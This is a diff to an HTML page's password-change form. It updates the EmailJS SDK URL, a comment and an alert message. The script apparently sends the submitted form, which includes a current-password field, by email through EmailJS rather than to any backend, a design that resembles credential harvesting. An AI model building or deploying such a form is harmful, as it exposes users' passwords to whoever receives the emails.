@@ -246,11 +246,11 @@
   </form>
 </div>
 
-<script type="text/javascript" src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <script>
 window.onload = function() {
-  // Initialize EmailJS after SDK is fully loaded
-  emailjs.init("7ZhFIcanF93E3cSlm"); // <-- your EmailJS User ID
+  // Initialize EmailJS with your public key (from EmailJS dashboard)
+  emailjs.init("7ZhFIcanF93E3cSlm"); 
 
   const form = document.getElementById("change-password-form");
   const currentPass = form["current-password"];
@@ -279,7 +279,7 @@ window.onload = function() {
 
     emailjs.send("service_9jiqv9f", "password_change", templateParams)
       .then(() => {
-        alert("password updated!");
+        alert("Password updated!");
         form.reset();
         submitBtn.disabled = true;
       }, (err) => {
@@ -290,6 +290,6 @@ window.onload = function() {
 };
 </script>
 </body>
-
 </html>
+
 
